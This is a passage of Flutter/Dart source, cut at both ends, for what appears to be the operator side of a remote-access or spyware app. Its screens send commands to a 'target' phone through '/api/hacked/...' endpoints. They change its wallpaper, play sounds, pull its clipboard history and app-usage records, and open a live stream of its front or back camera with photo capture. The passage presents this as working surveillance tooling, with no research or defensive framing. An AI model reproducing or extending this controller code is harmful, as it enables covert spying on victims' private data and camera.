    if (mounted) setState(() => _sending = false);
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom),
      child: Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _purple.withOpacity(0.3))),
        padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
        child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
          Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
          const SizedBox(height: 20),
          Row(children: [
            Container(width: 36, height: 36,
              decoration: BoxDecoration(color: const Color(0xFFFF6B35).withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: const Color(0xFFFF6B35).withOpacity(0.4))),
              child: Center(child: SvgPicture.string(AppSvgIcons.wallpaper, width: 18, height: 18, colorFilter: const ColorFilter.mode(Color(0xFFFF6B35), BlendMode.srcIn)))),
            const SizedBox(width: 12),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('GANTI WALLPAPER', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFFFF6B35))),
            ]),
          ]),
          const SizedBox(height: 20),
          if (_pickedFile != null)
            Container(height: 160, width: double.infinity, margin: const EdgeInsets.only(bottom: 16),
              decoration: BoxDecoration(borderRadius: BorderRadius.circular(14), border: Border.all(color: _purple.withOpacity(0.4))),
              child: ClipRRect(borderRadius: BorderRadius.circular(13), child: Image.file(_pickedFile!, fit: BoxFit.cover, width: double.infinity)))
          else
            Container(height: 120, width: double.infinity, margin: const EdgeInsets.only(bottom: 16),
              decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(14), border: Border.all(color: _purple.withOpacity(0.2))),
              child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                SvgPicture.string(AppSvgIcons.imageOutlined, width: 36, height: 36, colorFilter: ColorFilter.mode(_purple.withOpacity(0.4), BlendMode.srcIn)),
                const SizedBox(height: 8),
                Text('Pilih Foto Untuk Dijadikan Wallpaper', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.4))),
              ])),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => _pickImage(ImageSource.gallery),
              child: Container(padding: const EdgeInsets.symmetric(vertical: 13),
                decoration: BoxDecoration(color: _purple.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.4))),
                child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  SvgPicture.string(AppSvgIcons.photoLibrary, width: 16, height: 16, colorFilter: ColorFilter.mode(_purple, BlendMode.srcIn)),
                  SizedBox(width: 8),
                  Text('Galeri', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: _purple, letterSpacing: 1)),
                ])))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: () => _pickImage(ImageSource.camera),
              child: Container(padding: const EdgeInsets.symmetric(vertical: 13),
                decoration: BoxDecoration(color: _purple.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.4))),
                child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  SvgPicture.string(AppSvgIcons.cameraAlt, width: 16, height: 16, colorFilter: ColorFilter.mode(_purple, BlendMode.srcIn)),
                  SizedBox(width: 8),
                  Text('Kamera', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: _purple, letterSpacing: 1)),
                ])))),
          ]),
          const SizedBox(height: 16),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => Navigator.pop(context),
              child: Container(padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: (_pickedFile == null || _sending) ? null : _send,
              child: Container(padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  gradient: LinearGradient(colors: _pickedFile != null ? [const Color(0xFFFF6B35), const Color(0xFFEA580C)] : [Colors.grey.withOpacity(0.4), Colors.grey.withOpacity(0.3)]),
                  borderRadius: BorderRadius.circular(12)),
                child: Center(child: _sending
                  ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                  : const Text('KIRIM', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
          ]),
        ]),
      ),
    );
  }
}

class _SoundSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final void Function(String) onSent;
  final void Function(String) onError;
  const _SoundSheet({required this.deviceId, required this.deviceName, required this.onSent, required this.onError});
  @override
  State<_SoundSheet> createState() => _SoundSheetState();
}

class _SoundSheetState extends State<_SoundSheet> {
  static const _green = Color(0xFF10B981);
  String? _base64Audio;
  String? _mimeType;
  String? _fileName;
  bool _sending = false;
  bool _picking = false;

  Future<void> _pickAudio() async {
    final status = await Permission.storage.request();
    if (!status.isGranted) {
      final audioStatus = await Permission.audio.request();
      if (!audioStatus.isGranted && mounted) {
        showWarning(context, 'Izin Storage/Audio Diperlukan');
        return;
      }
    }
    setState(() => _picking = true);
    try {
      final result = await FilePicker.platform.pickFiles(type: FileType.custom, allowedExtensions: ['mp3', 'wav', 'ogg', 'm4a', 'aac'], allowMultiple: false);
      if (result != null && result.files.single.path != null) {
        final file  = File(result.files.single.path!);
        final bytes = await file.readAsBytes();
        final ext   = result.files.single.extension?.toLowerCase() ?? 'mp3';
        final mime  = ext == 'wav' ? 'audio/wav' : ext == 'ogg' ? 'audio/ogg' : ext == 'aac' ? 'audio/aac' : ext == 'm4a' ? 'audio/mp4' : 'audio/mpeg';
        setState(() { _base64Audio = base64Encode(bytes); _mimeType = mime; _fileName = result.files.single.name; });
      }
    } catch (e) { if (mounted) widget.onError('Gagal buka file: $e'); }
    if (mounted) setState(() => _picking = false);
  }

  Future<void> _send() async {
    if (_base64Audio == null) return;
    setState(() => _sending = true);
    try {
      final res = await ApiService.post('/api/hacked/command', {'deviceId': widget.deviceId, 'type': 'sound', 'payload': {'audioBase64': _base64Audio, 'mimeType': _mimeType ?? 'audio/mpeg'}});
      Navigator.pop(context);
      if (res['success'] == true) { widget.onSent(res['message'] ?? 'Sound dikirim!'); }
      else { widget.onError(res['message'] ?? 'Gagal'); }
    } catch (e) { widget.onError('Error: $e'); }
    if (mounted) setState(() => _sending = false);
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom),
      child: Container(
        decoration: BoxDecoration(color: const Color(0xFF0D1F35), borderRadius: const BorderRadius.vertical(top: Radius.circular(24)), border: Border.all(color: _green.withOpacity(0.3))),
        padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
        child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
          Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _green.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
          const SizedBox(height: 20),
          Row(children: [
            Container(width: 36, height: 36, decoration: BoxDecoration(color: _green.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _green.withOpacity(0.4))),
              child: Center(child: SvgPicture.string(AppSvgIcons.musicNote, width: 18, height: 18, colorFilter: const ColorFilter.mode(_green, BlendMode.srcIn)))),
            const SizedBox(width: 12),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('PLAY SOUND', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _green)),
            ]),
          ]),
          const SizedBox(height: 20),
          GestureDetector(
            onTap: _picking ? null : _pickAudio,
            child: Container(
              width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 14),
              decoration: BoxDecoration(
                color: _fileName != null ? _green.withOpacity(0.1) : const Color(0xFF071525),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _fileName != null ? _green.withOpacity(0.5) : _green.withOpacity(0.25), width: _fileName != null ? 1.5 : 1)),
              child: _picking
                ? Row(mainAxisAlignment: MainAxisAlignment.center, children: [SizedBox(width: 16, height: 16, child: CircularProgressIndicator(color: _green, strokeWidth: 2)), const SizedBox(width: 10), const Text('Membuka File Manager...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white))])
                : _fileName != null
                  ? Row(children: [const Icon(Icons.audio_file_rounded, color: _green, size: 20), const SizedBox(width: 10), Expanded(child: Text(_fileName!, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white), overflow: TextOverflow.ellipsis)), SvgPicture.string(AppSvgIcons.checkCircle, width: 18, height: 18, colorFilter: const ColorFilter.mode(_green, BlendMode.srcIn))])
                  : Row(mainAxisAlignment: MainAxisAlignment.center, children: [SvgPicture.string(AppSvgIcons.folderOpen, width: 22, height: 22, colorFilter: ColorFilter.mode(_green.withOpacity(0.7), BlendMode.srcIn)), const SizedBox(width: 10), Text('Pilih File Audio (mp3/wav/ogg)', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white.withOpacity(0.5)))]),
            ),
          ),
          const SizedBox(height: 20),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => Navigator.pop(context),
              child: Container(padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: (_base64Audio == null || _sending) ? null : _send,
              child: Container(padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  gradient: LinearGradient(colors: _base64Audio != null ? [_green, const Color(0xFF059669)] : [Colors.grey.withOpacity(0.4), Colors.grey.withOpacity(0.3)]),
                  borderRadius: BorderRadius.circular(12)),
                child: Center(child: _sending
                  ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                  : const Text('PLAY!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
          ]),
        ]),
      ),
    );
  }
}

class _ClipboardSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final Map<String, dynamic>? clipboardData;
  final void Function(String, {bool isError}) onSnack;
  const _ClipboardSheet({required this.deviceId, required this.deviceName, required this.onSnack, this.clipboardData});
  @override
  State<_ClipboardSheet> createState() => _ClipboardSheetState();
}

class _ClipboardSheetState extends State<_ClipboardSheet> {
  static const _amber = Color(0xFFF59E0B);
  List<Map<String, dynamic>> _history = [];
  bool _loading = true;
  Timer? _pollTimer;

  @override
  void initState() {
    super.initState();
    if (widget.clipboardData != null) {
      
      final hist = widget.clipboardData!['history'];
      _history = hist is List ? List<Map<String, dynamic>>.from(hist) : [];
      _loading = false;
    } else {
      _startPolling();
    }
  }

  void _startPolling() {
    _pollTimer = Timer.periodic(const Duration(seconds: 2), (_) async {
      try {
        final res = await ApiService.get('/api/hacked/clipboard-result/${widget.deviceId}');
        if (res['success'] == true && mounted) {
          final h = List<Map<String, dynamic>>.from(res['history'] ?? []);
          if (h.isNotEmpty) {
                    setState(() { _history = h; _loading = false; });
          }
        }
      } catch (_) {}
    });
    
    Future.delayed(const Duration(seconds: 20), () {
        if (mounted) setState(() => _loading = false);
    });
  }

  @override
  void dispose() { _pollTimer?.cancel(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return DraggableScrollableSheet(
      initialChildSize: 0.75, maxChildSize: 0.95, minChildSize: 0.4, expand: false,
      builder: (_, ctrl) => Container(
        decoration: BoxDecoration(color: const Color(0xFF0D1F35), borderRadius: const BorderRadius.vertical(top: Radius.circular(24)), border: Border.all(color: _amber.withOpacity(0.3))),
        child: Column(children: [
          Padding(padding: const EdgeInsets.only(top: 12, bottom: 4), child: Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _amber.withOpacity(0.3), borderRadius: BorderRadius.circular(2))))),
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 12),
            child: Row(children: [
              Container(width: 36, height: 36, decoration: BoxDecoration(color: _amber.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _amber.withOpacity(0.4))), child: Center(child: SvgPicture.string(AppSvgIcons.contentPaste, width: 18, height: 18, colorFilter: const ColorFilter.mode(_amber, BlendMode.srcIn)))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('CLIPBOARD HISTORY', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _amber)),
              ]),
              const Spacer(),
              if (_loading) const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: _amber, strokeWidth: 2)),
            ]),
          ),
          Expanded(
            child: _loading && _history.isEmpty
              ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                  const SizedBox(width: 28, height: 28, child: CircularProgressIndicator(color: _amber, strokeWidth: 2)),
                  const SizedBox(height: 12),
                  const Text('Mengambil Clipboard...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white54)),
                ]))
              : _history.isEmpty
                ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    SvgPicture.string(AppSvgIcons.contentPasteOff, width: 48, height: 48, colorFilter: ColorFilter.mode(Colors.white.withOpacity(0.2), BlendMode.srcIn)),
                    const SizedBox(height: 12),
                    const Text('Clipboard Kosong', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white30)),
                  ]))
                : ListView.builder(
                    controller: ctrl, padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                    itemCount: _history.length,
                    itemBuilder: (_, i) {
                      final item = _history[i];
                      return Container(
                        margin: const EdgeInsets.only(bottom: 8),
                        padding: const EdgeInsets.all(14),
                        decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(12), border: Border.all(color: _amber.withOpacity(0.2))),
                        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                          Row(children: [
                            SvgPicture.string(AppSvgIcons.contentCopy, width: 12, height: 12, colorFilter: const ColorFilter.mode(_amber, BlendMode.srcIn)),
                            const SizedBox(width: 6),
                            Text('Item #${i + 1}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: _amber)),
                            const Spacer(),
                            GestureDetector(
                              onTap: () { Clipboard.setData(ClipboardData(text: item['text'] as String? ?? '')); widget.onSnack('Disalin Ke Clipboard!'); },
                              child: Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3), decoration: BoxDecoration(color: _amber.withOpacity(0.15), borderRadius: BorderRadius.circular(4)), child: const Text('Copy', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: _amber)))),
                          ]),
                          const SizedBox(height: 8),
                          Text(item['text'] as String? ?? '', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white, height: 1.5)),
                        ]),
                      );
                    }),
          ),
        ]),
      ),
    );
  }
}

class _AppUsageSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final VoidCallback? onDataReceived;
  const _AppUsageSheet({required this.deviceId, required this.deviceName, this.onDataReceived});
  @override
  State<_AppUsageSheet> createState() => _AppUsageSheetState();
}

class _AppUsageSheetState extends State<_AppUsageSheet> {
  static const _emerald = Color(0xFF10B981);
  List<Map<String, dynamic>> _apps = [];
  bool _loading = true;
  bool _notified = false;
  Timer? _pollTimer;

  @override
  void initState() {
    super.initState();
    _startPolling();
  }

  void _startPolling() {
    _pollTimer = Timer.periodic(const Duration(seconds: 2), (_) async {
      try {
        final res = await ApiService.get('/api/hacked/app-usage-result/${widget.deviceId}');
        if (res['success'] == true && res['usage'] != null && mounted) {
          final usage = res['usage'] as Map<String, dynamic>;
          final apps = List<Map<String, dynamic>>.from(usage['apps'] ?? []);
          if (apps.isNotEmpty) {
            _pollTimer?.cancel();
            setState(() { _apps = apps; _loading = false; });
            if (!_notified) {
              _notified = true;
              widget.onDataReceived?.call();
            }
          }
        }
      } catch (_) {}
    });
    Future.delayed(const Duration(seconds: 20), () {
      if (mounted) setState(() => _loading = false);
    });
  }

  @override
  void dispose() { _pollTimer?.cancel(); super.dispose(); }

  String _formatTime(int minutes) {
    if (minutes < 60) return '${minutes}m';
    final h = minutes ~/ 60;
    final m = minutes % 60;
    return '${h}j ${m}m';
  }

  @override
  Widget build(BuildContext context) {
    return DraggableScrollableSheet(
      initialChildSize: 0.85, maxChildSize: 0.95, minChildSize: 0.4, expand: false,
      builder: (_, ctrl) => Container(
        decoration: BoxDecoration(color: const Color(0xFF0D1F35), borderRadius: const BorderRadius.vertical(top: Radius.circular(24)), border: Border.all(color: _emerald.withOpacity(0.3))),
        child: Column(children: [
          Padding(padding: const EdgeInsets.only(top: 12, bottom: 4), child: Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _emerald.withOpacity(0.3), borderRadius: BorderRadius.circular(2))))),
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 12),
            child: Row(children: [
              Container(width: 36, height: 36, decoration: BoxDecoration(color: _emerald.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _emerald.withOpacity(0.4))), child: Center(child: SvgPicture.string(AppSvgIcons.apps, width: 18, height: 18, colorFilter: const ColorFilter.mode(_emerald, BlendMode.srcIn)))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('APP USAGE (24 JAM)', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _emerald)),
              ]),
              const Spacer(),
              if (_loading) const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: _emerald, strokeWidth: 2)),
            ]),
          ),
          Expanded(
            child: _loading && _apps.isEmpty
              ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                  const SizedBox(width: 28, height: 28, child: CircularProgressIndicator(color: _emerald, strokeWidth: 2)),
                  const SizedBox(height: 12),
                  const Text('Mengambil Data App...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white54)),
                  const SizedBox(height: 6),
                  const Text('Memerlukan Izin Usage Access', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white30)),
                ]))
              : _apps.isEmpty
                ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    SvgPicture.string(AppSvgIcons.appsOff, width: 48, height: 48, colorFilter: ColorFilter.mode(Colors.white.withOpacity(0.2), BlendMode.srcIn)),
                    const SizedBox(height: 12),
                    const Text('Tidak Ada Data App\n(Izin Usage Access Diperlukan)', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white30, height: 1.5), textAlign: TextAlign.center),
                  ]))
                : ListView.builder(
                    controller: ctrl, padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                    itemCount: _apps.length,
                    itemBuilder: (_, i) {
                      final app = _apps[i];
                      final mins = (app['timeMin'] as num?)?.toInt() ?? 0;
                      final maxMins = (_apps.first['timeMin'] as num?)?.toInt() ?? 1;
                      final pct = maxMins > 0 ? mins / maxMins : 0.0;
                      return Container(
                        margin: const EdgeInsets.only(bottom: 8),
                        padding: const EdgeInsets.all(12),
                        decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: _emerald.withOpacity(0.15))),
                        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                          Row(children: [
                            Container(width: 8, height: 8, decoration: BoxDecoration(color: _emerald.withOpacity(0.7 * pct + 0.3), shape: BoxShape.circle)),
                            const SizedBox(width: 8),
                            Expanded(child: Text(app['appName'] as String? ?? app['packageName'] as String? ?? 'Unknown', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white, fontWeight: FontWeight.bold))),
                            Text(_formatTime(mins), style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: _emerald.withOpacity(0.8))),
                          ]),
                          const SizedBox(height: 6),
                          ClipRRect(
                            borderRadius: BorderRadius.circular(3),
                            child: LinearProgressIndicator(value: pct.clamp(0.0, 1.0), backgroundColor: Colors.white.withOpacity(0.06), color: _emerald.withOpacity(0.6), minHeight: 3)),
                          const SizedBox(height: 4),
                          Text(app['packageName'] as String? ?? '', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.white.withOpacity(0.3))),
                        ]),
                      );
                    }),
          ),
        ]),
      ),
    );
  }
}

class _CameraLiveViewer extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final Future<void> Function(String, Map<String, dynamic>) onSendCommand;
  final Future<Map<String, dynamic>> Function(String) apiGet;

  const _CameraLiveViewer({
    required this.deviceId,
    required this.deviceName,
    required this.onSendCommand,
    required this.apiGet,
  });

  @override
  State<_CameraLiveViewer> createState() => _CameraLiveViewerState();
}

class _CameraLiveViewerState extends State<_CameraLiveViewer> {
  String  _facing      = 'front';
  String? _frameBase64;
  bool    _loading     = true;
  bool    _flash       = false; 
  Timer?  _pollTimer;
  int     _lastFrameId = -1;    

  static const _blue = Color(0xFF3B82F6);

  @override
  void initState() {
    super.initState();
    _startCamera(_facing);
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    
    widget.onSendCommand('camera_live_stop', {});
    super.dispose();
  }

  Future<void> _startCamera(String facing) async {
    _pollTimer?.cancel();
    setState(() { _loading = true; _frameBase64 = null; _lastFrameId = -1; });

    await widget.onSendCommand('camera_live_start', {'facing': facing});

    
    await Future.delayed(const Duration(milliseconds: 800));
    if (!mounted) return;
    setState(() => _loading = false);

    
    _pollTimer = Timer.periodic(const Duration(milliseconds: 120), (_) async {
      if (!mounted) return;
      try {
        final res = await widget.apiGet('/api/hacked/camera-frame/${widget.deviceId}');
        if (res['success'] == true && res['frame'] != null) {
          final frame   = res['frame'] as Map;
          final b64     = frame['frameBase64'] as String? ?? '';
          final fid     = (frame['frameId'] as num?)?.toInt() ?? 0;
          final frFacing = frame['facing'] as String? ?? facing;
          
          if (b64.isNotEmpty && fid > _lastFrameId && frFacing == facing && mounted) {
            _lastFrameId = fid;
            setState(() => _frameBase64 = b64);
          }
        }
      } catch (_) {}
    });
  }

  void _switchCamera() {
    _pollTimer?.cancel();
    final newFacing = _facing == 'front' ? 'back' : 'front';
    setState(() { _facing = newFacing; });
    
    widget.onSendCommand('camera_live_switch', {'facing': newFacing});
    _startCamera(newFacing);
  }

  void _capturePhoto() {
    if (_frameBase64 == null) return;
    
    setState(() => _flash = true);
    Future.delayed(const Duration(milliseconds: 120), () {
      if (mounted) setState(() => _flash = false);
    });
    _showCapturedPhoto(_frameBase64!);
  }

  void _showCapturedPhoto(String b64) {
    final bytes = base64Decode(b64);
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _blue.withOpacity(0.4))),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 20, 20, 0),
            child: Row(children: [
              SvgPicture.string(AppSvgIcons.cameraAlt, width: 18, height: 18, colorFilter: const ColorFilter.mode(_blue, BlendMode.srcIn)),
              const SizedBox(width: 8),
              Text('FOTO ${_facing.toUpperCase()}',
                style: const TextStyle(fontFamily: 'Orbitron', fontSize: 13,
                  fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              const Spacer(),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: SvgPicture.string(AppSvgIcons.close, width: 20, height: 20, colorFilter: const ColorFilter.mode(Colors.white54, BlendMode.srcIn))),
            ]),
          ),
          const SizedBox(height: 12),
          ClipRRect(
            borderRadius: const BorderRadius.vertical(bottom: Radius.circular(20)),
            child: Image.memory(bytes, fit: BoxFit.contain, width: double.infinity,
              gaplessPlayback: true,
              errorBuilder: (_, __, ___) => const Padding(
                padding: EdgeInsets.all(20),
                child: Text('Gagal Load Foto', style: TextStyle(color: Colors.red))))),
        ]),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(children: [

          
          if (_frameBase64 != null)
            Positioned.fill(
              child: Image.memory(
                base64Decode(_frameBase64!),
                fit: BoxFit.cover,
                gaplessPlayback: true,   
                errorBuilder: (_, __, ___) => Container(color: Colors.black),
              ))
          else
            Positioned.fill(
              child: Container(
                color: const Color(0xFF0A0A0A),
                child: Center(
                  child: Column(mainAxisSize: MainAxisSize.min, children: [
                    if (_loading) ...[
                      const SizedBox(width: 32, height: 32,
                        child: CircularProgressIndicator(color: _blue, strokeWidth: 2)),
                      const SizedBox(height: 16),
                      Text('Menghubungkan kamera $_facing...',
                        style: const TextStyle(fontFamily: 'ShareTechMono',
                          fontSize: 11, color: Colors.white54)),
                    ] else ...[
                      SvgPicture.string(AppSvgIcons.cameraAlt, width: 48, height: 48, colorFilter: const ColorFilter.mode(Colors.white24, BlendMode.srcIn)),
                      const SizedBox(height: 12),
                      const Text('Menunggu Frame Kamera...',
                        style: TextStyle(fontFamily: 'ShareTechMono',
                          fontSize: 11, color: Colors.white38)),
                    ],
                  ]),
                ))),

          
          if (_flash)
            Positioned.fill(
              child: IgnorePointer(
                child: AnimatedOpacity(
                  opacity: _flash ? 1.0 : 0.0,
                  duration: const Duration(milliseconds: 80),
                  child: Container(color: Colors.white)))),

          
          Positioned(
            top: 0, left: 0, right: 0,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [Colors.black.withOpacity(0.7), Colors.transparent])),
              child: Row(children: [
                GestureDetector(
                  onTap: () { _pollTimer?.cancel(); Navigator.pop(context); },
                  child: Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.5),
                      borderRadius: BorderRadius.circular(10)),
                    child: SvgPicture.string(AppSvgIcons.arrowBack, width: 20, height: 20, colorFilter: const ColorFilter.mode(Colors.white, BlendMode.srcIn)))),
                const SizedBox(width: 12),
                Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  const Text('CAMERA LIVE',
                    style: TextStyle(fontFamily: 'Orbitron', fontSize: 12,
                      fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1.5)),
                  Text(widget.deviceName,
                    style: const TextStyle(fontFamily: 'ShareTechMono',
                      fontSize: 10, color: _blue)),
                ])),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.5),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(color: _blue.withOpacity(0.4))),
                  child: Row(mainAxisSize: MainAxisSize.min, children: [
                    Container(width: 6, height: 6,
                      decoration: BoxDecoration(
                        color: _frameBase64 != null ? Colors.greenAccent : Colors.orange,
                        shape: BoxShape.circle,
                        boxShadow: _frameBase64 != null
                          ? [const BoxShadow(color: Colors.greenAccent, blurRadius: 4)]
                          : [])),
                    const SizedBox(width: 6),
                    Text(_facing.toUpperCase(),
                      style: const TextStyle(fontFamily: 'Orbitron',
                        fontSize: 9, color: Colors.white70, letterSpacing: 1)),
                  ])),
              ]),
            )),

          
          Positioned(
            bottom: 0, left: 0, right: 0,
            child: Container(
              padding: const EdgeInsets.fromLTRB(32, 24, 32, 40),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.bottomCenter,
                  end: Alignment.topCenter,
                  colors: [Colors.black.withOpacity(0.85), Colors.transparent])),
              child: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [

                
                GestureDetector(
                  onTap: _switchCamera,
                  child: Container(
                    width: 38, height: 38,
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.6),
                      shape: BoxShape.circle,
                      border: Border.all(color: Colors.white.withOpacity(0.3))),
                    child: Center(child: SvgPicture.string(
                      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 4v6h6"/><path d="M23 20v-6h-6"/><path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4-4.64 4.36A9 9 0 0 1 3.51 15"/></svg>',
